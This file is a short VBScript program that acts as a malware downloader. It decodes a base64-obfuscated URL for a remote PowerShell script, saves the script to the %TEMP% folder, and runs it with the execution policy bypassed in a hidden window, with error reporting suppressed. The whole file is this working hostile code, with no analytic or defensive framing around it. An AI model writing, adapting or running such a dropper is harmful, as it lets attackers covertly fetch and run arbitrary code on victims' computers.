Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.XMLHTTP")
Set stream = CreateObject("ADODB.Stream")

b64url = "aHR0cHM6Ly8zLTRweC5wYWdlcy5kZXYvQS5wczE="
url = shell.Exec("powershell -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & b64url & "'))").StdOut.ReadAll
dest = shell.ExpandEnvironmentStrings("%TEMP%\A.ps1")

On Error Resume Next

http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    stream.Type = 1 'binary
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile dest, 2
    stream.Close
    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & dest & """", 0, False
End If
